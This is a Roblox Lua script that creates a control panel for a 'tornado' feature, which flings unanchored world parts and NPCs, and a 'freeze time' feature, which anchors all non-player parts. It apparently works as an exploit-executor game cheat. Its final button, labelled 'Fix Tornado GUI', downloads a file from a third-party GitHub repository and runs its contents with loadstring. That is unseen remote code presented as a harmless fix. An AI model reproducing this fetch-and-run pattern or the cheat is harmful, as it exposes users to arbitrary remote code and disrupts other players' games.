local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local localPlayer = Players.LocalPlayer

-- Tornado settings
local enabled = false
local tornadoSpinSpeed = 80
local tornadoUpwardSpeed = 50
local tornadoRadius = 40
local tornadoWindfield = 100
local tornadoMoveSpeed = 10
local maxWanderDistance = 500
local tornadoInwardPullSpeed = 50 -- inward pull speed default

local tornadoPosition = nil
local randomPathing = false
local pickedUpByFunnel = {}
local whitelistedParts = {}
local baseplateName = "Baseplate"

-- Freeze Time independent toggle and state
local freezeTimeActive = false
local frozenParts = {}

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "TornadoBlastGUI"
screenGui.ResetOnSpawn = false
screenGui.DisplayOrder = 100
screenGui.IgnoreGuiInset = true
screenGui.Parent = localPlayer:WaitForChild("PlayerGui")

-- UI Elements
local hideToggle = Instance.new("TextButton")
hideToggle.Size = UDim2.new(0, 40, 0, 20)
hideToggle.Position = UDim2.new(0, 10, 0.5, -10)
hideToggle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
hideToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
hideToggle.Font = Enum.Font.SourceSansBold
hideToggle.TextSize = 14
hideToggle.Text = "Hide"
hideToggle.Parent = screenGui

local inputsVisible = true
local function toggleInputs()
    inputsVisible = not inputsVisible
    for _, child in ipairs(screenGui:GetChildren()) do
        if (child:IsA("TextBox") or child:IsA("TextLabel")) and not (child == hideToggle or child == toggleBtn or child == pathingToggle or child == freezeBtn or child == fixGuiBtn) then
            child.Visible = inputsVisible
        end
    end
end

hideToggle.MouseButton1Click:Connect(function()
    toggleInputs()
    hideToggle.Text = inputsVisible and "Hide" or "Show"
end)

local function createLabeledTextbox(labelText, default, index)
    local perRow = 4
    local row = math.floor(index / perRow)
    local col = index % perRow
    local xOffset = 0.02 + 0.25 * col
    local yOffset = 60 + (row * 60)

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0, 160, 0, 16)
    label.Position = UDim2.new(xOffset, 0, 0, yOffset)
    label.BackgroundTransparency = 1
    label.Text = labelText
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.SourceSans
    label.TextSize = 14
    label.ZIndex = 2
    label.Parent = screenGui

    local box = Instance.new("TextBox")
    box.Size = UDim2.new(0, 160, 0, 20)
    box.Position = UDim2.new(xOffset, 0, 0, yOffset + 18)
    box.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
    box.TextColor3 = Color3.fromRGB(0, 0, 0)
    box.Font = Enum.Font.SourceSans
    box.TextSize = 14
    box.Text = tostring(default)
    box.ZIndex = 2
    box.Parent = screenGui

    return box
end

local inputBoxes = {
    {"Spin Speed", tornadoSpinSpeed},
    {"Upward Speed", tornadoUpwardSpeed},
    {"Rotation Radius", tornadoRadius},
    {"Windfield Radius", tornadoWindfield},
    {"Tornado Movement Speed", tornadoMoveSpeed},
    {"Max Distance from Player", maxWanderDistance},
    {"Inward Pull Speed", tornadoInwardPullSpeed}, -- NEW textbox added here
}

local references = {}
for i, data in ipairs(inputBoxes) do
    references[i] = createLabeledTextbox(data[1], data[2], i - 1)
end

references[1].FocusLost:Connect(function() local v = tonumber(references[1].Text); if v then tornadoSpinSpeed = v end end)
references[2].FocusLost:Connect(function() local v = tonumber(references[2].Text); if v then tornadoUpwardSpeed = v end end)
references[3].FocusLost:Connect(function() local v = tonumber(references[3].Text); if v then tornadoRadius = v end end)
references[4].FocusLost:Connect(function() local v = tonumber(references[4].Text); if v then tornadoWindfield = v end end)
references[5].FocusLost:Connect(function() local v = tonumber(references[5].Text); if v then tornadoMoveSpeed = v end end)
references[6].FocusLost:Connect(function() local v = tonumber(references[6].Text); if v then maxWanderDistance = v end end)
references[7].FocusLost:Connect(function() local v = tonumber(references[7].Text); if v then tornadoInwardPullSpeed = v end end) -- NEW connection

-- Tornado toggle button
local toggleBtn = Instance.new("TextButton")
toggleBtn.Size = UDim2.new(0, 24, 0, 24)
toggleBtn.Position = UDim2.new(0.5, -130, 0, 10)
toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleBtn.Font = Enum.Font.SourceSansBold
toggleBtn.TextSize = 16
toggleBtn.Text = "O"
toggleBtn.ZIndex = 2
toggleBtn.Parent = screenGui

-- Pathing toggle button
local pathingToggle = Instance.new("TextButton")
pathingToggle.Name = "PathToggle"
pathingToggle.Size = UDim2.new(0, 120, 0, 24)
pathingToggle.Position = UDim2.new(0.5, -100, 0, 40)
pathingToggle.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
pathingToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
pathingToggle.Font = Enum.Font.SourceSansBold
pathingToggle.TextSize = 14
pathingToggle.Text = "Path: Follow Player"
pathingToggle.Parent = screenGui

pathingToggle.MouseButton1Click:Connect(function()
    randomPathing = not randomPathing
    pathingToggle.Text = randomPathing and "Path: Random" or "Path: Follow Player"
end)

-- Freeze Time toggle button (fully independent)
local freezeBtn = Instance.new("TextButton")
freezeBtn.Size = UDim2.new(0, 120, 0, 24)
freezeBtn.Position = UDim2.new(0.5, 10, 0, 40)
freezeBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 80)
freezeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
freezeBtn.Font = Enum.Font.SourceSansBold
freezeBtn.TextSize = 14
freezeBtn.Text = "Freeze Time: Off"
freezeBtn.Parent = screenGui

-- Fix GUI Button
local fixGuiBtn = Instance.new("TextButton")
fixGuiBtn.Size = UDim2.new(0, 120, 0, 24)
fixGuiBtn.Position = UDim2.new(0.5, 140, 0, 40)
fixGuiBtn.BackgroundColor3 = Color3.fromRGB(50, 80, 50)
fixGuiBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
fixGuiBtn.Font = Enum.Font.SourceSansBold
fixGuiBtn.TextSize = 14
fixGuiBtn.Text = "Fix Tornado GUI"
fixGuiBtn.Parent = screenGui

-- Helper functions
local function isPlayerPart(part)
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Character and part:IsDescendantOf(plr.Character) then
            return true
        end
    end
    return false
end

local function isNPCPart(part)
    if part:IsDescendantOf(localPlayer.Character) then
        return false
    end
    if part.Name == baseplateName then
        return false
    end
    local model = part:FindFirstAncestorOfClass("Model")
    if model and model:FindFirstChildOfClass("Humanoid") then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character == model then
                return false
            end
        end
        return true
    end
    return false
end

local function anchorPart(part)
    if part and part:IsA("BasePart") and not part.Anchored and not isPlayerPart(part) and part.Name ~= baseplateName then
        if isNPCPart(part) or (not isPlayerPart(part) and part.Name ~= baseplateName) then
            part.Anchored = true
            frozenParts[part] = true
        end
    end
end

local function unanchorAllParts()
    for part in pairs(frozenParts) do
        if part and part:IsA("BasePart") then
            part.Anchored = false
        end
    end
    frozenParts = {}
end

local newPartsConnection = nil

local function freezeAllExistingParts()
    for _, part in ipairs(Workspace:GetDescendants()) do
        anchorPart(part)
    end
end

local function onPartAdded(part)
    if part:IsA("BasePart") then
        task.defer(function()
            anchorPart(part)
        end)
    end
end

-- Freeze Time toggle logic (completely independent)
freezeBtn.MouseButton1Click:Connect(function()
    freezeTimeActive = not freezeTimeActive
    freezeBtn.Text = freezeTimeActive and "Freeze Time: On" or "Freeze Time: Off"
    if freezeTimeActive then
        freezeAllExistingParts()
        if not newPartsConnection then
            newPartsConnection = Workspace.DescendantAdded:Connect(onPartAdded)
        end
    else
        unanchorAllParts()
        if newPartsConnection then
            newPartsConnection:Disconnect()
            newPartsConnection = nil
        end
    end
end)

-- Tornado logic (fully separate from freeze time)
local function applyTornado(position)
    local parts = Workspace:GetPartBoundsInRadius(position, tornadoWindfield)
    for _, obj in ipairs(parts) do
        if obj:IsA("BasePart") and not obj.Anchored and not isPlayerPart(obj) and obj.Name ~= baseplateName then
            if not whitelistedParts[obj] then
                pickedUpByFunnel[obj] = true
                whitelistedParts[obj] = true
            end
            if whitelistedParts[obj] then
                local offset = obj.Position - position
                local horizontalOffset = Vector3.new(offset.X, 0, offset.Z)
                local distance = horizontalOffset.Magnitude

                local dirToCenter = horizontalOffset.Magnitude > 0 and horizontalOffset.Unit or Vector3.zero
                local spinDir = Vector3.new(-dirToCenter.Z, 0, dirToCenter.X)

                -- ** Fixed inward pull: stronger pull the further away the part is,
                -- controlled by tornadoInwardPullSpeed **
                local inwardPull
                if distance > 0 then
                    inwardPull = -dirToCenter * tornadoInwardPullSpeed
                else
                    inwardPull = Vector3.zero
                end

                local upward = Vector3.new(0, tornadoUpwardSpeed, 0)
                local rotational = spinDir * tornadoSpinSpeed

                obj.CanCollide = false
                obj.AssemblyLinearVelocity = rotational + inwardPull + upward
            end
        end
    end
end

local function tornadoLoop()
    while enabled do
        local root = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
        if root then
            if not randomPathing then
                tornadoPosition = root.Position
            end
            applyTornado(tornadoPosition)
        end
        task.wait(0.1)
    end
end

local function wanderLoop()
    while enabled do
        local root = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
        if root and randomPathing then
            local targetPos = root.Position + Vector3.new(math.random(-maxWanderDistance, maxWanderDistance), 0, math.random(-maxWanderDistance, maxWanderDistance))
            if tornadoPosition then
                local direction = targetPos - tornadoPosition
                local distance = direction.Magnitude
                local maxStep = tornadoMoveSpeed * 0.1
                if distance > 0.01 then
                    local moveStep = direction.Unit * math.min(distance, maxStep)
                    tornadoPosition += moveStep
                end
            else
                tornadoPosition = targetPos
            end
        end
        task.wait(math.random(1, 30))
    end
end

-- Tornado toggle button logic (does NOT affect freeze time)
toggleBtn.MouseButton1Click:Connect(function()
    enabled = not enabled
    toggleBtn.Text = enabled and "X" or "O"
    if enabled then
        pickedUpByFunnel = {}
        whitelistedParts = {}

        task.spawn(tornadoLoop)
        task.spawn(wanderLoop)
    else
        for part in pairs(whitelistedParts) do
            if part and part:IsA("BasePart") then
                part.AssemblyLinearVelocity = Vector3.zero
                part.CanCollide = true
            end
        end
    end
end)

-- Fix Tornado GUI button
fixGuiBtn.MouseButton1Click:Connect(function()
    local success, err = pcall(function()
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md'), true))()
    end)
    if not success then
        warn("Failed to run Fix Tornado GUI script:", err)
    end
end)
